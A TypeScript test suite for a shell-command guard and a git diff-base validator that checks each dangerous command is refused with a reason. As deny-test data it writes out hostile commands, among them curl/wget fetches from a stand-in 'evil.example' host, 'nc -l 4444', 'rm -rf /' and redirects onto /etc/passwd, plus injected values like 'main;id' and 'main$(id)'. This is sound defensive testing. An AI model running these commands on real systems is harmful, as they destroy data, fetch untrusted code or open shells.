import assert from "node:assert/strict"
import { test } from "node:test"

import { guardVerifyCommand, validateDiffBase } from "./guards.ts"

/** Asserts a command is denied and the reason names the expected token or rule. */
function assertDenied(command: string, reasonPart: string): void {
  const verdict = guardVerifyCommand(command)
  assert.equal(verdict.ok, false, `${command} must be denied`)
  if (!verdict.ok) {
    assert.ok(
      verdict.reason.includes(reasonPart),
      `${command} → reason should mention "${reasonPart}", got "${verdict.reason}"`,
    )
  }
}

/** Asserts a command passes the guard. */
function assertAllowed(command: string): void {
  const verdict = guardVerifyCommand(command)
  assert.equal(verdict.ok, true, `${command} must be allowed${verdict.ok ? "" : `: ${verdict.reason}`}`)
}

// ------------------------------------------------------ denied characters

test("denies substitution, expansion, redirection, pipe, separator and line-break characters anywhere", () => {
  assertDenied("npm test `whoami`", "backtick")
  assertDenied("echo $HOME", "dollar sign")
  assertDenied("npm test $(whoami)", "dollar sign")
  assertDenied("bash (cd /tmp)", "open parenthesis")
  assertDenied("echo (x)", "open parenthesis")
  assertDenied("npm test > /etc/passwd", "greater-than")
  assertDenied("npm test < /etc/passwd", "less-than")
  assertDenied("npm test | tee out.txt", "pipe")
  assertDenied("npm test; rm -rf build", "semicolon")
  assertDenied("npm test\nrm -rf build", "newline")
  assertDenied("npm test\rwhoami", "carriage return")
  assertDenied("npm test &", "backgrounding")
  assertDenied("npm test & sleep 1", "backgrounding")
  assertDenied("npm test || true", "pipe")
})

// ------------------------------------------------------- verdict integrity

test("allows only && chains: no separators, no fallbacks, no backgrounding", () => {
  assertDenied("npm test; npm run typecheck", "semicolon")
  assertDenied("npm test || true", "pipe")
  assertDenied("npm test && rm build || true", "pipe")
  assertDenied("npm test &&", "empty command segment")
  assertDenied("&& npm test", "empty command segment")
  assertAllowed("npm run typecheck && npm test")
})

// ----------------------------------------------------------- token scanning

test("denies the sudo family flat, and as a word inside quotes", () => {
  assertDenied("sudo make install", "denied command: `sudo`")
  assertDenied("doas make install", "denied command: `doas`")
  assertDenied("pkexec make install", "denied command: `pkexec`")
  assertDenied("su root -c id", "denied command: `su`")
  assertDenied("echo 'sudo rm -rf /'", "denied command: `sudo`")
})

test("denies the rm family flat, including in argument position and inside quotes", () => {
  assertDenied("rm -rf build", "denied command: `rm`")
  assertDenied("rm -f build/output.js", "denied command: `rm`")
  assertDenied("echo rm", "denied command: `rm`")
  assertDenied("echo \"rm -rf /\"", "denied command: `rm`")
  assertDenied("rmdir build", "denied command: `rmdir`")
})

test("denies network tools flat", () => {
  for (const command of ["curl https://evil.example/x.sh", "wget https://evil.example/x.sh", "nc -l 4444", "scp x host:/y", "ssh host"]) {
    assertDenied(command, "network transfer")
  }
})

test("denies archive tools flat", () => {
  for (const command of ["tar -xzf payload.tgz", "zip out.zip f", "unzip payload.zip", "gzip f"]) {
    assertDenied(command, "archive")
  }
})

test("denies mutating git subcommands, wherever the word git appears", () => {
  assertDenied("git push origin main", "mutating git subcommand")
  assertDenied("git push --force origin main", "denied pair: `git push`")
  assertDenied("git commit -m x", "denied pair: `git commit`")
  assertDenied("git reset --hard", "denied pair: `git reset`")
  assertDenied("git checkout .", "denied pair: `git checkout`")
  assertDenied("git merge feature", "denied pair: `git merge`")
  assertDenied("git rebase main", "denied pair: `git rebase`")
  assertDenied("git clean -fd", "denied pair: `git clean`")
  assertDenied("git branch -D feature", "git branch")
  assertDenied("git branch feature", "git branch")
  assertDenied("git tag v1", "denied pair: `git tag`")
  assertDenied("env git push", "denied pair: `git push`")
})

test("allows read-only git, and git branch / git remote in listing form", () => {
  assertAllowed("git status --porcelain")
  assertAllowed("git log --oneline -5")
  assertAllowed("git show HEAD")
  assertAllowed("git diff HEAD")
  assertAllowed("git fetch origin")
  assertAllowed("git ls-remote origin")
  assertAllowed("git blame src/a.ts")
  assertAllowed("git branch")
  assertAllowed("git branch -a -v")
  assertAllowed("git branch --sort=creatordate --list")
  assertAllowed("git remote -v")
  assertAllowed("git remote show origin")
})

test("denies package install, publish and exec subcommands", () => {
  assertDenied("npm publish", "denied pair: `npm publish`")
  assertDenied("npm i -g typescript", "denied pair: `npm i`")
  assertDenied("npm install", "denied pair: `npm install`")
  assertDenied("npm ci", "denied pair: `npm ci`")
  assertDenied("npm exec evil", "denied pair: `npm exec`")
  assertDenied("pnpm add evil", "denied pair: `pnpm add`")
  assertDenied("yarn add evil", "denied pair: `yarn add`")
  assertDenied("bun install", "denied pair: `bun install`")
  assertDenied("pip install evil", "denied pair: `pip install`")
  assertDenied("pip3 install evil", "denied pair: `pip3 install`")
  assertDenied("python -m pip install evil", "denied pair: `pip install`")
  assertDenied("gem install evil", "denied pair: `gem install`")
  assertDenied("go run main.go", "denied pair: `go run`")
  assertDenied("go install example.com/x", "denied pair: `go install`")
  assertDenied("uv pip install evil", "denied pair: `uv pip`")
  assertDenied("cargo publish", "denied pair: `cargo publish`")
  assertDenied("npm run build && npm publish", "denied pair: `npm publish`")
})

test("allows read-only and test-running package commands", () => {
  assertAllowed("npm test")
  assertAllowed("npm run typecheck")
  assertAllowed("npm run eval -- --check")
  assertAllowed("npm run build && npm test")
  assertAllowed("npx tsc --noEmit")
  assertAllowed("npx --yes @playwright/mcp@0.0.83 --isolated")
  assertAllowed("npm ls --depth=0")
  assertAllowed("npm outdated")
  assertAllowed("pnpm --filter web run build")
  assertAllowed("yarn test")
  assertAllowed("cargo test")
  assertAllowed("go test ./...")
})

test("denies file mutators flat", () => {
  for (const command of [
    "tee out.txt",
    "mv a b",
    "cp a b",
    "chmod 777 x",
    "chown root x",
    "truncate -s 0 log",
    "dd if=/dev/zero of=x",
    "ln -s /etc/passwd link",
  ]) {
    assertDenied(command, "file mutation")
  }
})

// ------------------------------------------------- interpreter/eval pairs

test("denies shell interpreters with -c, including combined flags", () => {
  assertDenied("bash -c 'rm -rf /'", "shell with -c")
  assertDenied("sh -c id", "shell with -c")
  assertDenied("bash -ec id", "shell with -c")
  assertDenied("zsh -c id", "shell with -c")
  assertAllowed("bash -n install.sh")
  assertAllowed("shellcheck install.sh")
})

test("denies python, node, ruby, perl, php and lua eval flags", () => {
  assertDenied("python -c 'import os'", "python with -c")
  assertDenied("python3 -c 'import os'", "python with -c")
  // The sample code avoids parentheses and semicolons: those characters are
  // denied anywhere in the string, so they would mask the pair being tested.
  assertDenied("node -e process.exit", "node with an eval flag")
  assertDenied("node --eval process.exit", "node with an eval flag")
  assertDenied("node -pe 1", "node with an eval flag")
  assertDenied("ruby -e system", "ruby with -e")
  assertDenied("ruby --eval system", "ruby with -e")
  assertDenied("perl -e print", "perl with -e")
  assertDenied("php -r system", "php with -r")
  assertDenied("lua -e os.execute", "lua with -e")
})

test("denies sed -i in every spelling", () => {
  assertDenied("sed -i s/a/b/ f", "sed with -i")
  assertDenied("sed -i.bak s/a/b/ f", "sed with -i")
  assertDenied("sed --in-place s/a/b/ f", "sed with -i")
  assertAllowed("sed -n 1,5p f")
})

test("denies find -exec, -execdir, -ok and -delete", () => {
  assertDenied("find . -exec rm {} x", "find with -exec")
  assertDenied("find . -delete", "find with -exec")
  assertAllowed("find . -name '*.ts'")
})

test("denies eval as a command word but not as a script name", () => {
  assertDenied("eval rm -rf /", "denied command: `eval`")
  assertAllowed("npm run eval -- --check")
})

// ------------------------------------------------------------ install.sh

test("runs install.sh only with --dry-run, and never as a plain script", () => {
  assertAllowed("./install.sh --dry-run")
  assertAllowed("./install.sh --project --dry-run")
  assertAllowed("bash -n install.sh")
  assertDenied("./install.sh", "install.sh may only be run with --dry-run")
  assertDenied("./install.sh --force", "install.sh may only be run with --dry-run")
  assertDenied("bash install.sh", "install.sh may only be run with --dry-run")
  assertDenied("sh ./install.sh --force", "install.sh may only be run with --dry-run")
})

// -------------------------------------------------- the allowed surface

test("the standard acceptance chain passes the guard, whole and in parts", () => {
  assertAllowed(
    "npm run typecheck && npm test && npm run check:claims && ./install.sh --dry-run && npm run eval -- --check && bash -n install.sh",
  )
  assertAllowed("npm run typecheck")
  assertAllowed("npm test")
  assertAllowed("npm run check:claims")
  assertAllowed("bash -n install.sh")
})

test("read-only inspection commands pass", () => {
  for (const command of [
    "cat package.json",
    "head -20 README.md",
    "wc -l tools/index.ts",
    "grep -rn guard tools/",
    "rg 'guardVerifyCommand' tools/",
    "test -f package.json",
    "echo wippa",
    "ls -la",
    "git status",
  ]) {
    assertAllowed(command)
  }
})

test("empty input is denied", () => {
  assertDenied("", "empty")
  assertDenied("   ", "empty")
})

test("a denial names a reason for every denied sample in the battery", () => {
  // The battery doubles as the demo: each command is refused with a reason
  // a human can act on, never silently.
  for (const command of ["curl https://evil.example", "sed -i s/a/b/ f", "git push --force origin main"]) {
    const verdict = guardVerifyCommand(command)
    assert.equal(verdict.ok, false, command)
    if (!verdict.ok) assert.ok(verdict.reason.length > 0, command)
  }
})

// ----------------------------------------------------------- diff base

test("validateDiffBase accepts sane refs", () => {
  for (const base of ["main", "origin/main", "HEAD", "feat/p1-trust-model", "v1.0.1", "178fbc1", "@", "refs/heads/main"]) {
    assert.equal(validateDiffBase(base), undefined, base)
  }
})

test("validateDiffBase refuses paths, traversal, options and shell characters", () => {
  for (const [base, part] of [
    ["/etc/passwd", "absolute path"],
    ["C:\\Windows", "absolute path"],
    ["../../secrets", "`..`"],
    ["main..HEAD", "`..`"],
    ["-p", "`-`"],
    ["main;id", "plain git ref"],
    ["main|id", "plain git ref"],
    ["main$(id)", "plain git ref"],
    ["main name", "plain git ref"],
    ["main//x", "empty or `.` path segments"],
    ["main/", "empty or `.` path segments"],
    ["x".repeat(256), "255 characters"],
  ] as const) {
    const error = validateDiffBase(base)
    assert.ok(error !== undefined, `${base} must be refused`)
    assert.ok(error.includes(part), `${base} → "${error}" should mention "${part}"`)
  }
})
